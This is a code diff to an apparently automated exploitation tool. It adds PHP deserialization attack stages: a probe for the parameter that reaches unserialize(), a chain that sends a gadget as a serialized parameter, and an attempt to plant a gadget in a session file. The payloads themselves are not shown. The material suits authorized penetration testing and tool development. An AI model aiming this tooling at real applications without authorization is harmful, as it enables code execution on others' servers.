@@ -53,6 +53,7 @@ FINDINGS = "proto.findings"
 WRAPPERS = "proto.wrappers"
 RUNTIME = "proto.runtime"
 PROVEN = "proto.proven"
+UNSERIALIZE_SINK = "proto.unserialize.sink"
 
 # Families whose payloads read a file the host keeps, not one the application
 # owns. Asking a Java file reader for `index.php` proves nothing.
@@ -653,6 +654,50 @@ def run_phar_chain(ctx: RunContext) -> None:
     exploit_phar(ctx)
 
 
+def run_unserialize_chain(ctx: RunContext) -> None:
+    """The same gadget, handed straight to a parameter instead of inside an archive."""
+    from .deserialize import exploit_unserialize
+
+    exploit_unserialize(ctx)
+
+
+def find_unserialize_sink(ctx: RunContext) -> None:
+    """Look for the parameter whose value is handed to `unserialize()`.
+
+    Worth doing before the chain is aimed: it narrows which parameter the gadget
+    is worth sending to, and when it hits it says why that one rather than the
+    others. The chain does not depend on it - a production deployment sets
+    `display_errors` off, and then the function's own error is thrown away - so a
+    miss here is not a reason to skip the attempt.
+    """
+    if ctx.blackboard.get(UNSERIALIZE_SINK):
+        return
+
+    from ...engine.unserializesink import probe_unserialize_sink
+
+    for param in _candidates(ctx):
+        if ctx.stopped:
+            return
+        found = probe_unserialize_sink(ctx, param)
+        if not found.confirmed:
+            continue
+        ctx.emit(f"  [+] {found.describe()}")
+        ctx.blackboard.set(
+            UNSERIALIZE_SINK,
+            found.param,
+            evidence=found.evidence,
+            confidence=Confidence.CONFIRMED,
+        )
+        return
+
+
+def run_session_chain(ctx: RunContext) -> None:
+    """The session file, which is a call site rather than a parameter."""
+    from .deserialize import exploit_session
+
+    exploit_session(ctx)
+
+
 def report_summary(ctx: RunContext) -> None:
     """Print what the run proved, and be explicit when it proved nothing."""
     # The chain state is not entered without --exploit, so an action that never
@@ -737,10 +782,25 @@ def build_graph(name: str = "proto") -> StateGraph:
             description="get an archive's metadata deserialized on the target",
             actions=[
                 Action(
+                    "probe.unserialize-sink",
+                    "look for the value that reaches unserialize()",
+                    find_unserialize_sink,
+                ),
+                Action(
                     "exploit.phar",
                     "point the archive-opening parameter at a gadget and read the result",
                     run_phar_chain,
-                )
+                ),
+                Action(
+                    "exploit.unserialize",
+                    "hand the gadget to a parameter as a serialized value",
+                    run_unserialize_chain,
+                ),
+                Action(
+                    "exploit.session",
+                    "find the session file and try to put a gadget in it",
+                    run_session_chain,
+                ),
             ],
             transitions=[Transition("finish", lambda ctx: True, "done")],
         )
